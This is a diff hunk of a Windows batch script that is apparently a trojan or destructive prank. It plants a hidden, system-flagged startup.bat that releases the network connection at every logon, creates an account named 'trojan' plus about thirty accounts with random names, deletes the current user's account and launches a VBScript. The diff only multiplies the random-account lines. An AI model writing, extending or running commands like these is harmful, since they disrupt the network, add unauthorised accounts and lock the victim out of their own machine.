@@ -155,8 +155,39 @@ start https://www.youtube.com/watch?v=AK8uJcCsRDM
 cd "C:\Users\volde\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 echo ipconfig /release > startup.bat
 attrib +h +s +r startup.bat
-net user 𝔀𝓮𝓷𝓸𝓶𝓮𝓬𝓱𝓪𝓲𝓷𝓼𝓪𝓶𝓪.𝓮𝔁𝓮 death /add
-net user 𝔀𝓮𝓷𝓸𝓶𝓮𝓬𝓱𝓪𝓲𝓷𝓼𝓪𝓶𝓪 death /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
 net user 𝓽𝓻𝓸𝓳𝓪𝓷 death /add
 net user %USERNAME% /delete
 start sc.vbs
